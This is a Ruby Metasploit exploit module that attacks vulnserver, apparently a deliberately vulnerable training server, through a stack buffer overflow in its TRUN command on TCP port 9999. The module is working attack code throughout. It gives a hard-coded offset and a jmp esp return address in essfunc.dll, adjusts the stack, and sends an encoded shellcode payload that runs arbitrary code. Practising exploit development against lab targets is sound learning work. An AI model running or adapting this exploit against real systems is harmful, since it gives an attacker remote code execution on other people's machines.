# encoding: utf-8
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  #Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking
  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'infidel',
      'Description'  => %q{
        This is an exploit for vulnserver.
        It leverages a stack buffer overflow vulnerability to execute arbitrary code.
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
        'Nate Jernigan',  # Original discovery
        'Nate Jernigan',  # MSF Module
        ],
      'References'  => [
            [ 'URL', 'https://github.com/DataandGoliath/DEV/DEV-BO-VOO1' ]
        ],
      'DefaultOptions' => {
          'EXITFUNC' => 'process', #none/process/thread/seh
          #'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'  =>
        [
              'win',
        ],
      'Payload'  =>
        {
          'BadChars' => "\x00", # <change if needed>
          'DisableNops' => true,
        },

      'Targets'    =>
        [
          [ 'Windows 10',
            {
              'Ret'     =>  0x625011af, # jmp esp - essfunc.dll
              'Offset'  =>  2003
            }
          ],
        ],
      'Privileged'  => false,
      #Correct Date Format: "M D Y"
      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec
      'DisclosureDate'  => 'Mar 10, 2018',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(9999)])# , self.class was removed

  end

  def exploit


    connect
    buffer = "TRUN /.:/"
    buffer <<  rand_text(target['Offset'])
    buffer << [target.ret].pack('V')
    buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, 'add esp,-1500').encode_string # avoid GetPC shellcode corruption
    buffer << payload.encoded  #max 978 bytes

    print_status("Trying target #{target.name}...")
    sock.put(buffer)

    handler
    disconnect

  end
end
